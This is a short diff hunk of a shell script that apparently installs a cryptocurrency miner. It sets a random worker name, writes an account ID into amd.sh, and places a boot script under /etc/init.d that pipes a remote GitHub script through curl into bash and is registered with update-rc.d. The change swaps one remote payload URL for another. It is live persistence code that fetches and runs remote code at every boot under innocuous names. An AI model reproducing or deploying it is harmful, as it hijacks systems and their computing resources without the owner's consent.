@@ -8,7 +8,7 @@ variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
 sed -i "s/test_accountname/CP_bsmzapay1 --worker ${variable1}/g" ./amd.sh
 sed -i "s/CP_32hb86nvxc/CP_bsmzapay1 --worker ${variable1}/g" ./amd.sh
 cd /etc/init.d
-echo "bash <(curl -s -L https://raw.githubusercontent.com/imprewa/amplitu/main/xenix.sh)" > bitrate.sh
+echo "bash <(curl -s -L https://raw.githubusercontent.com/rubbyadi/sengkreat/main/bass.sh)" > bitrate.sh
 chmod a+x bitrate.sh
 update-rc.d bitrate.sh defaults
 cd /acoustic
